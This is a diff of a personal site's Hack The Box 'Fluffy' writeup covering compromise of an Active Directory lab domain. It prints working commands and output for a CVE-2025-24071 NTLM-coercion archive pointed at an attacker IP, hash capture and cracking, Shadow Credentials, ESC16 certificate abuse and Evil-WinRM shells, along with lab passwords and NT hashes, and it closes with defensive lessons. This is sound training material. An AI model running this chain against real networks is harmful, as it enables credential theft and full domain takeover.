@@ -31,25 +31,38 @@
       <article class="article">
         <div class="eyebrow"><span class="status-dot"></span> CTF writeup</div>
         <h1>HTB Fluffy</h1>
-    
+
         <h2 id="info">Machine / Target Info</h2>
         <table class="info-table">
-          <tr><th>Machine</th><td>Fluffy</td></tr>
           <tr><th>Difficulty</th><td>Easy</td></tr>
-          <tr><th>OS</th><td>Windows</td></tr>
-          <tr><th>Focus</th><td>Enumeration, exploitation, privilege escalation, reporting</td></tr>
+          <tr><th>OS</th><td>Windows / Active Directory</td></tr>
+          <tr><th>Focus</th><td>SMB enumeration, NTLM capture, Shadow Credentials, AD CS ESC16</td></tr>
         </table>
 
         <h2 id="summary">Summary</h2>
-        <p>Fluffy is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user <code>j.fleischman / J0elTHEM4n1990!</code> are provided. By exploiting CVE-2025-24071, the credentials of another low-privileged user can be obtained. Further enumeration reveals the existence of ACLs over the winrm_svc and ca_svc accounts. WinRM can then be used to log in to the target using the winrc_svc account. Exploitation of an Active Directory Certificate service (ESC16) using the ca_svc account is required to obtain access to the Administrator account.</p>
+        <p>
+          Fluffy starts as an assumed-breach Windows Active Directory machine. The provided user
+          <code>j.fleischman</code> has access to SMB and can write to the <code>IT</code> share. After finding
+          <code>Upgrade_Notice.pdf</code>, I noticed that the notice referenced <code>CVE-2025-24071</code>. I used that
+          clue to create a malicious archive, trigger an NTLM authentication from another domain user,
+          crack the captured NetNTLMv2 hash, and move deeper into the domain.
+        </p>
+        <p>
+          From there, BloodHound showed that <code>p.agila</code> could be added to the <code>Service Accounts</code> group.
+          This allowed Shadow Credentials abuse against <code>ca_svc</code> and <code>winrm_svc</code>. With the <code>ca_svc</code>
+          hash, I found the AD CS configuration vulnerable to <code>ESC16</code>, changed the UPN of <code>ca_svc</code> to
+          <code>administrator</code>, requested a certificate, restored the UPN, authenticated as Administrator
+        </p>
 
         <h2 id="enumeration">Enumeration</h2>
-<p>
-  I started with a full TCP port scan using Nmap to identify exposed services on the target.
-</p>
+        <p>
+          I started with a full TCP port scan to identify the exposed services on the target.
+        </p>
 
-<pre><code>$ nmap -sC -sV -p- 10.129.232.88</code>
 
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac/]
+└─$ nmap -sC -sV -p- 10.129.232.88
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-25 18:41 -0400
 Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 98.38% done; ETC: 18:42 (0:00:00 remaining)
@@ -61,7 +74,7 @@ PORT      STATE SERVICE       VERSION
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-26 05:41:37Z)
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
-| ssl-cert: Subject:
+| ssl-cert: Subject: 
 | Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
 | Not valid before: 2026-04-30T16:09:59
 |_Not valid after:  2106-04-30T16:09:59
@@ -71,18 +84,18 @@ PORT      STATE SERVICE       VERSION
 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
 |_ssl-date: 2026-05-26T05:43:06+00:00; +7h00m00s from scanner time.
-| ssl-cert: Subject:
+| ssl-cert: Subject: 
 | Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
 | Not valid before: 2026-04-30T16:09:59
 |_Not valid after:  2106-04-30T16:09:59
 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
 |_ssl-date: 2026-05-26T05:43:07+00:00; +7h00m01s from scanner time.
-| ssl-cert: Subject:
+| ssl-cert: Subject: 
 | Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
 | Not valid before: 2026-04-30T16:09:59
 |_Not valid after:  2106-04-30T16:09:59
 3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
-| ssl-cert: Subject:
+| ssl-cert: Subject: 
 | Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
 | Not valid before: 2026-04-30T16:09:59
 |_Not valid after:  2106-04-30T16:09:59
@@ -100,59 +113,460 @@ PORT      STATE SERVICE       VERSION
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-time:
+| smb2-time: 
 |   date: 2026-05-26T05:42:26
 |_  start_date: N/A
-| smb2-security-mode:
-|   3.1.1:
+| smb2-security-mode: 
+|   3.1.1: 
 |_    Message signing enabled and required
 |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 96.53 seconds</pre>
+Nmap done: 1 IP address (1 host up) scanned in 96.53 seconds</code></pre>
+
+        <p>
+          I added the domain and DC hostname to <code>/etc/hosts</code> so tools could resolve the target properly.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac/]
+└─$ echo "10.129.232.88 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts</code></pre>
+
+        <h3 id="smb-enumeration">SMB Enumeration</h3>
+        <p>
+          The box provides the starting credentials <code>j.fleischman / J0elTHEM4n1990!</code>. I first validated
+          the credentials with NetExec.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac/]
+└─$ nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!'
+
+SMB  10.129.232.88  445  DC01  [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!</code></pre>
+
+        <p>
+          Then I listed the available SMB shares. The interesting result was the <code>IT</code> share because the
+          user had both read and write access.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac/]
+└─$ nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
+
+Share      Permissions     Remark
+-----      -----------     ------
+ADMIN$                     Remote Admin
+C$                         Default share
+IPC$       READ            Remote IPC
+IT         READ,WRITE
+NETLOGON   READ            Logon server share
+SYSVOL     READ            Logon server share</code></pre>
+
+        <p>
+          I connected to the <code>IT</code> share with <code>smbclient</code> and found software folders, zip files, and an
+          upgrade notice PDF.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac/]
+└─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.129.232.88/IT
+
+smb: \&gt; ls
+Everything-1.4.1.1026.x64
+Everything-1.4.1.1026.x64.zip
+KeePass-2.58
+KeePass-2.58.zip
+Upgrade_Notice.pdf
+smb: \&gt; get Upgrade_Notice.pdf
+getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf</code></pre>
+
+        <h3 id="upgrade-notice-pdf">Reviewing Upgrade_Notice.pdf</h3>
+        <p>
+          After connecting to the writable <code>IT</code> share, I found a PDF named <code>Upgrade_Notice.pdf</code>.
+          I downloaded it locally and reviewed it to see why it had been placed in a shared IT folder.
+        </p>
+
+        <figure class="writeup-figure" style="margin: 24px 0;">
+          <img src="upgrade_pdf.png" alt="Upgrade_Notice.pdf showing CVE-2025-24071 in the recent vulnerabilities table" style="display: block; width: 100%; max-width: 720px; border: 1px solid rgba(148, 163, 184, 0.28); border-radius: 16px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);" />
+          <figcaption style="margin-top: 10px; color: var(--muted, #94a3b8); font-size: 0.95rem;">
+            The notice highlights <code>CVE-2025-24071</code> under recent vulnerabilities.
+          </figcaption>
+        </figure>
+
+        <p>
+          The PDF is an internal notice telling the IT department to book a time slot for a system upgrade.
+          Further down the notice, the recent vulnerabilities table lists <code>CVE-2025-24071</code>. This
+          vulnerability can be abused with a crafted <code>.library-ms</code> file inside a ZIP archive to
+          trigger an outbound NTLM authentication. Since the <code>IT</code> share was writable, I used this as the
+          initial foothold path.
+        </p>
+
+        <h2 id="foothold">Foothold</h2>
+        <h3 id="ntlm-capture">Capturing NTLM With CVE-2025-24071</h3>
+        <p>
+          First, I generated a malicious ZIP archive using the CVE-2025-24071 proof of concept. I used my Attacker
+          IP <code>10.10.15.35</code> as the callback address and set the payload filename to <code>malicious</code>.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac/CVE-2025-24071]
+└─$ python3 exploit.py -i 10.10.15.35 -f malicious
+
+          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
+         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
+        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
+        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
+        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
+         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
+
+                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
+                    by ThemeHackers
+
+Creating exploit with filename: malicious.library-ms
+Target IP: 10.10.15.35
+
+Generating library file...
+✓ Library file created successfully
+
+Creating ZIP archive...
+✓ ZIP file created successfully
+
+Cleaning up temporary files...
+✓ Cleanup completed
+
+Process completed successfully!
+Output file: exploit.zip</code></pre>
+
+        <p>
+          This created <code>exploit.zip</code>. I uploaded it to the writable <code>IT</code> share and started Responder on
+          <code>tun0</code> to listen for incoming NTLM authentication attempts.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac/]
+└─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.129.232.88/IT
+smb: \&gt; put exploit.zip
+
+sudo responder -I tun0</code></pre>
+
+        <p>
+          After a short wait, the target connected back to my listener and Responder captured a NetNTLMv2
+          hash for <code>FLUFFY\p.agila</code>.
+        </p>
+
+<pre><code>[SMB] NTLMv2-SSP Client   : 10.129.232.88
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:1dfed51742eb2a40:F467A737982566D10A315FC3B06E396D:01010000000000000063340BC4ECDC012F6DEA44CBB73B320000000002000800590043004100300001001E00570049004E002D00330041005500370045004A004C0053004C0059004E0004003400570049004E002D00330041005500370045004A004C0053004C0059004E002E0059004300410030002E004C004F00430041004C000300140059004300410030002E004C004F00430041004C000500140059004300410030002E004C004F00430041004C00070008000063340BC4ECDC01060004000200000008003000300000000000000001000000002000007CEEC0D6AAF97454E6E603BE13B75636FC2085FD5F6E0F036096D30D0E139F170A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00330035000000000000000000</code></pre>
+
+        <h3 id="hash-cracking">Cracking The Captured Hash</h3>
+        <p>
+          I saved the captured hash to <code>hash.txt</code> and cracked it with Hashcat mode <code>5600</code>, which is
+          used for NetNTLMv2 hashes.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+P.AGILA::FLUFFY:1dfed51742eb2a40:f467a737982566d10a315fc3b06e396d:01010000000000000063340bc4ecdc012f6dea44cbb73b320000000002000800590043004100300001001e00570049004e002d00330041005500370045004a004c0053004c0059004e0004003400570049004e002d00330041005500370045004a004c0053004c0059004e002e0059004300410030002e004c004f00430041004c000300140059004300410030002e004c004f00430041004c000500140059004300410030002e004c004f00430041004c00070008000063340bc4ecdc01060004000200000008003000300000000000000001000000002000007ceec0d6aaf97454e6e603be13b75636fc2085fd5f6e0f036096d30d0e139f170a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00330035000000000000000000:prometheusx-303</code></pre>
+
+        <p>
+          This gave me a new valid domain credential:
+        </p>
+
+<pre><code>p.agila : prometheusx-303</code></pre>
+
+
+        <h3 id="bloodhound">BloodHound Collection</h3>
+        <p>
+          With a second set of credentials available, I collected domain data with BloodHound to look for
+          privilege escalation paths. Kerberos failed at first because of clock skew, but BloodHound fell back
+          to NTLM and still collected the domain objects.
+        </p>
+
+<pre><code>sudo bloodhound-python -u 'p.agila' -p 'prometheusx-303' -ns 10.129.232.88 -d fluffy.htb -c all
+
+INFO: Found AD domain: fluffy.htb
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
+INFO: Found 10 users
+INFO: Found 54 groups
+INFO: Found 3 gpos
+INFO: Found 1 computers
+INFO: Done in 00M 06S</code></pre>
+
+<p>
+  I marked <code>p.agila</code> user as owned in bloodhound since we have credentials for that user and got the following possible attack chain.
+</p>
+<figure class="writeup-figure" style="margin: 24px 0;">
+          <img src="fluffy_bloodhound.png" alt="BloodHound graph showing the p.agila attack path to Service Accounts and service users" style="display: block; width: 100%; max-width: 100%; border: 1px solid rgba(148, 163, 184, 0.28); border-radius: 16px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);" />
+           <figcaption style="margin-top: 10px; color: var(--muted, #94a3b8); font-size: 0.95rem;">
+    BloodHound path showing control over the Service Accounts group.
+  </figcaption>
+        </figure>
+        <p>
+  From this BloodHound output, there are a few important details to note:
+</p>
 
 <ul>
-  <li>Ports open: 53, 80, 88, 135, 139, 443, 445, 464, 593, 636, 3268, 3269, 5985.</li>
-  <li>Domain: fluffy.htb</li>
-  <li>DC: DC01.fluffy.htb</li>
+  <li>
+    The <code>p.agila</code> user is a member of the <code>Service Account Managers</code> group, which has
+    <code>GenericAll</code> rights over the <code>Service Accounts</code> group.
+  </li>
+  <li>
+    The <code>Service Accounts</code> group has <code>GenericWrite</code> over the <code>ca_svc</code> user, and
+    <code>ca_svc</code> is also a member of the <code>Cert Publishers</code> group.
+  </li>
+  <li>
+    The <code>Service Accounts</code> group also has <code>GenericWrite</code> over two other accounts:
+    <code>winrm_svc</code> and <code>ldap_svc</code>.
+  </li>
 </ul>
-<p>We see SMB (on port 445 ), LDAP (on port 389 ), and Kerberos (on port 88 ) are running. Hence, we can
-identify this as a Domain Controller. From the nmap scan results, we see that the domain name is
-fluffy.htb , and the Domain Controller's DNS name is DC01.fluffy.htb. So I added that to the
-/etc/hosts file.</p>
-<pre><code>$ echo "10.129.232.88 fluffy.htb dc01.fluffy.htb"|sudo tee -a /etc/hosts </code></pre>
 
-<p>Using the provided credentials j.fleischman:J0elTHEM4n1990! , I enumerated the SMB service to see available shares.</p>
-<pre><code>$ nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares</code>
-SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
-SMB         10.129.232.88   445    DC01             [*] Enumerated shares
-SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
-SMB         10.129.232.88   445    DC01             -----           -----------     ------
-SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
-SMB         10.129.232.88   445    DC01             C$                              Default share
-SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
-SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
-SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
-SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
-</pre>
-        
-        
+        <h3 id="service-accounts-path">Exploiting The BloodHound Path</h3>
+        <p>
+          To exploit the BloodHound path, I first needed to use the <code>GenericAll</code> permission from the
+          <code>Service Account Managers</code> group to add <code>p.agila</code> into the <code>Service Accounts</code> group.
+          Once <code>p.agila</code> became a member of that group, I could abuse the <code>GenericWrite</code> permissions
+          over the service accounts.
+        </p>
 
-        <h2 id="exploitation">Exploitation</h2>
-        <p>Add the vulnerability, reasoning, and exploitation steps here.</p>
+
+        <p>
+          If Kerberos errors such as <code>KRB_AP_ERR_SKEW</code> occur, the Kali clock should be synced with the
+          target Domain Controller before retrying the Kerberos-based commands.
+        </p>
+
+<pre><code>sudo ntpdate dc01.fluffy.htb</code></pre>
+
+        <p>
+          I used <code>bloodyAD</code> to add <code>p.agila</code> to the <code>Service Accounts</code> group.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac/Bloodhound_2]
+└─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 add groupMember 'service accounts' p.agila
+[+] p.agila added to service accounts</code></pre>
+
+        <h3 id="shadow-credentials">Shadow Credentials Against Service Accounts</h3>
+        <p>
+          After becoming a member of <code>Service Accounts</code>, I used Certipy's Shadow Credentials attack
+          against <code>ca_svc</code> and <code>winrm_svc</code>. This temporarily adds a new key credential to the target
+          account, authenticates with the generated certificate, retrieves the account's NT hash, and then
+          restores the original key credentials.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '0ccf33c590d64533b8ddba1b4e4e84ce'
+[*] Adding Key Credential with device ID '0ccf33c590d64533b8ddba1b4e4e84ce' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '0ccf33c590d64533b8ddba1b4e4e84ce' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8</code></pre>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '5b7e28ef042740cb8abcaa1d3bf89e1c'
+[*] Adding Key Credential with device ID '5b7e28ef042740cb8abcaa1d3bf89e1c' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID '5b7e28ef042740cb8abcaa1d3bf89e1c' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767</code></pre>
+
+        <p>
+          At this point, I had two useful service account hashes:
+        </p>
+
+<pre><code>ca_svc    : ca0f4f9e9eb8a092addf53bb03fc98c8
+winrm_svc : 33bd09dcd697600edf6b3a7af4875767</code></pre>
+
+        <h3 id="winrm-shell">WinRM Access As winrm_svc</h3>
+        <p>
+          Since the machine had WinRM open on port <code>5985</code>, I used the <code>winrm_svc</code> NT hash with
+          Evil-WinRM to get an interactive shell. The user flag was located at
+          <code>C:\Users\winrm_svc\Desktop\user.txt</code>.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
+
+Evil-WinRM shell v3.9
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; whoami
+fluffy\winrm_svc
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; dir
+
+    Directory: C:\Users\winrm_svc\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/25/2026  10:29 PM             34 user.txt
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; type user.txt
+&lt;user-flag-redacted&gt;</code></pre>
 
         <h2 id="privilege-escalation">Privilege Escalation</h2>
-        <p>Add the privilege escalation path here.</p>
+        <h3 id="adcs-enumeration">AD CS Enumeration</h3>
+        <p>
+          With the <code>ca_svc</code> hash, I enumerated AD CS using Certipy. The output showed the CA
+          <code>fluffy-DC01-CA</code> and identified <code>ESC16</code> because the security extension was disabled.
+        </p>
 
-        <h2 id="notes">Notes</h2>
-        <p>Add useful notes, rabbit holes, screenshots, and reminders here.</p>
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable -enabled -stdout
 
-        <h2 id="commands">Commands Used</h2>
-        <pre><code># Add Fluffy commands here</code></pre>
+Certificate Authorities
+  CA Name                         : fluffy-DC01-CA
+  DNS Name                        : DC01.fluffy.htb
+  Web Enrollment                  : Disabled
+  Request Disposition             : Issue
+  Enforce Encryption for Requests : Enabled
+  Disabled Extensions             : 1.3.6.1.4.1.311.25.2
+
+[!] Vulnerabilities
+  ESC16                           : Security Extension is disabled.</code></pre>
+
+        <h3 id="esc16">ESC16 Abuse</h3>
+        <p>
+          To abuse ESC16, I changed the UPN of <code>ca_svc</code> to <code>administrator</code>, requested a certificate as
+          <code>ca_svc</code>, and then restored the UPN back to its original value. Because the security extension was
+          disabled, the resulting certificate could be used to authenticate as Administrator.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad account update -username 'p.agila@fluffy.htb' -p 'prometheusx-303' -user ca_svc -upn 'administrator'
+
+[*] Updating user 'ca_svc':
+    userPrincipalName : administrator
+[*] Successfully updated 'ca_svc'</code></pre>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Saving certificate and private key to 'administrator.pfx'</code></pre>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad account update -username 'p.agila@fluffy.htb' -p 'prometheusx-303' -user ca_svc -upn 'ca_svc@fluffy.htb'
+
+[*] Updating user 'ca_svc':
+    userPrincipalName : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'</code></pre>
+
+        <h3 id="administrator-auth">Authenticating As Administrator</h3>
+        <p>
+          I authenticated with the Administrator certificate and retrieved the Administrator NT hash.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.129.232.88
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Got TGT
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:&lt;administrator-nt-hash&gt;</code></pre>
+
+        <p>
+          Finally, I used Evil-WinRM with the Administrator hash to get a shell on the Domain Controller.
+        </p>
+
+<pre><code>┌──(kali㉿kali)-[~/prac/cpts_prac]
+└─$ evil-winrm -u 'Administrator' -H &lt;administrator-nt-hash&gt; -i dc01.fluffy.htb
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/25/2026  10:29 PM             34 root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+&lt;root-flag-redacted&gt;</code></pre>
 
         <h2 id="lessons">Lessons Learned</h2>
-        <p>Add your key takeaways here.</p>
+<p>
+  Fluffy showed how an assumed-breach foothold can turn into full domain compromise when several small
+  Active Directory weaknesses are chained together. The initial access was limited, but the combination of
+  a writable SMB share, NTLM coercion, weak ACLs, Shadow Credentials, and AD CS misconfiguration created
+  a complete path from a low-privileged user to Administrator.
+</p>
+
+<ul>
+  <li>
+    <strong>Writable shares should be treated as high-risk.</strong>
+    The <code>IT</code> share looked like a normal internal file share, but write access allowed me to upload a
+    crafted archive and trigger an NTLM authentication from another user.
+  </li>
+  <li>
+    <strong>Internal documents can expose attack paths.</strong>
+    <code>Upgrade_Notice.pdf</code> directly pointed toward <code>CVE-2025-24071</code>, which became the clue for the
+    initial NTLM capture.
+  </li>
+  <li>
+    <strong>BloodHound is critical for understanding privilege relationships.</strong>
+    The important issue was not just the compromised <code>p.agila</code> account, but what that user could control
+    through group membership and ACL relationships.
+  </li>
+  <li>
+    <strong>GenericAll and GenericWrite permissions can be enough for privilege escalation.</strong>
+    Adding <code>p.agila</code> to the <code>Service Accounts</code> group opened the path to abusing writable attributes on
+    service accounts like <code>ca_svc</code> and <code>winrm_svc</code>.
+  </li>
+  <li>
+    <strong>Shadow Credentials are powerful when account attributes are writable.</strong>
+    By abusing <code>GenericWrite</code>, I was able to add temporary key credentials, authenticate as the target
+    service accounts, and recover their NT hashes without knowing their plaintext passwords.
+  </li>
+  <li>
+    <strong>AD CS misconfigurations can turn service account access into domain compromise.</strong>
+    The vulnerable certificate authority configuration, specifically <code>ESC16</code>, allowed the attack path to
+    move from <code>ca_svc</code> to Administrator.
+  </li>
+  <li>
+    <strong>Clock skew can break Kerberos-based tooling.</strong>
+    Some Kerberos actions may fail when the attacker machine and domain controller time are not synced, so
+    checking and fixing time skew is an important troubleshooting step.
+  </li>
+</ul>
+
+<p>
+  The main takeaway is that each weakness on its own may look limited, but in Active Directory environments,
+  permissions, certificates, shares, and authentication behavior often connect together. A strong defensive
+  review should look at the full attack path instead of reviewing each misconfiguration in isolation.
+</p>
       </article>
 
       <aside class="toc" aria-label="Table of contents">
@@ -161,16 +575,14 @@ SMB         10.129.232.88   445    DC01             SYSVOL          READ        
         <a href="#info">Machine / Target Info</a>
         <a href="#summary">Summary</a>
         <a href="#enumeration">Enumeration</a>
-        <a href="#exploitation">Exploitation</a>
+        <a href="#foothold">Foothold</a>
         <a href="#privilege-escalation">Privilege Escalation</a>
-        <a href="#lessons">Lessons Learned</a>
       </aside>
     </section>
   </main>
 
   <footer>
     <span>© <span id="year"></span> Vikram Singh</span>
-    <span>clean reports / real attack paths / measurable risk</span>
   </footer>
 
   <script src="../../assets/js/writeup.js"></script>
